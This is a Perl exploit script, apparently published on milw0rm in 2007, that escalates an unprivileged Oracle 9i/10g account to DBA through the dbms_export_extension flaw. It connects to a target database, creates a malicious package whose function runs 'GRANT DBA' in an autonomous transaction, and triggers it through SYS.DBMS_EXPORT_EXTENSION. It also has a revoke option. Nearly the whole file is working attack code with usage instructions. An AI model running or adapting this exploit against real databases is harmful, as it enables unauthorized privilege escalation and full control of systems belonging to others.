#!/usr/bin/perl
#
# Remote Oracle dbms_export_extension exploit (any version)
# Grant or revoke dba permission to unprivileged user
# 
# Tested on Oracle 10g - Release 10.2.0.1.0
#	    Oracle  9i - Release  9.2.0.2.0
# 
#   REF:    http://www.securityfocus.com/bid/17699
#
#   AUTHOR: Andrea "bunker" Purificato
#           http://rawlab.mindcreations.com
#
#   DATE:   Copyright 2007 - Sun Feb  4 15:53:04 CET 2007
#
# Oracle InstantClient (basic + sdk) required for DBD::Oracle
#
use warnings;
use strict;
use DBI;
use DBD::Oracle;
use Getopt::Std;
use vars qw/ %opt /;

sub usage {
    print <<"USAGE";
    
Syntax: $0 -h <host> -s <sid> -u <user> -p <passwd> -g|-r

Options:
     -h     <host>     target server address
     -s     <sid>      target sid name
     -u     <user>     user
     -p     <passwd>   password 

     -g|-r             (g)rant dba to user | (r)evoke dba from user

USAGE
    exit 0
}

my $opt_string = 'h:s:u:p:gr';
getopts($opt_string, \%opt) or &usage;
&usage if ( !$opt{h} or !$opt{s} or !$opt{u} or !$opt{p} );
&usage if ( !$opt{g} and !$opt{r} );
my $user = uc $opt{u};

my $dbh = DBI->connect("dbi:Oracle:host=$opt{h};sid=$opt{s}", $opt{u}, $opt{p}) or die;

my $sqlcmd = "GRANT DBA TO $user";

print "[-] Wait...\n";
$dbh->{RaiseError} = 1;

if ($opt{r}) {
    print "[-] Revoking DBA from $user...\n";
    $sqlcmd = "REVOKE DBA FROM $user";
    $dbh->do( $sqlcmd );
    print "[-] Done!\n";
    $dbh->disconnect;
    exit;
}

$dbh->do( qq{ 
CREATE OR REPLACE PACKAGE BUNKERPKG AUTHID CURRENT_USER IS
FUNCTION ODCIIndexGetMetadata (oindexinfo SYS.odciindexinfo,P3
VARCHAR2,p4 VARCHAR2,env SYS.odcienv) RETURN NUMBER;
END;
} );

print "[-] Building evil package\n";

$dbh->do(qq{ 
CREATE OR REPLACE PACKAGE BODY BUNKERPKG IS
FUNCTION ODCIIndexGetMetadata (oindexinfo SYS.odciindexinfo,P3
VARCHAR2,p4 VARCHAR2,env SYS.odcienv) RETURN NUMBER IS
pragma autonomous_transaction;
BEGIN
EXECUTE IMMEDIATE '$sqlcmd';
COMMIT;
RETURN(1);
END;
END;
} );

print "[-] Finishing evil package\n";

$dbh->do(qq{ 
DECLARE
INDEX_NAME VARCHAR2(200);
INDEX_SCHEMA VARCHAR2(200);
TYPE_NAME VARCHAR2(200);
TYPE_SCHEMA VARCHAR2(200);
VERSION VARCHAR2(200);
NEWBLOCK PLS_INTEGER;
GMFLAGS NUMBER;
v_Return VARCHAR2(200);
BEGIN
INDEX_NAME := 'A1';
INDEX_SCHEMA := '$user';
TYPE_NAME := 'BUNKERPKG';
TYPE_SCHEMA := '$user';
VERSION := '';
GMFLAGS := 1;
v_Return := SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_METADATA(
INDEX_NAME => INDEX_NAME, INDEX_SCHEMA => INDEX_SCHEMA, TYPE_NAME
=> TYPE_NAME,
TYPE_SCHEMA => TYPE_SCHEMA, VERSION => VERSION, NEWBLOCK =>
NEWBLOCK, GMFLAGS => GMFLAGS
);
END;
} );

print "[-] YOU GOT THE POWAH!!\n";

$dbh->disconnect;

exit;

# milw0rm.com [2007-02-05]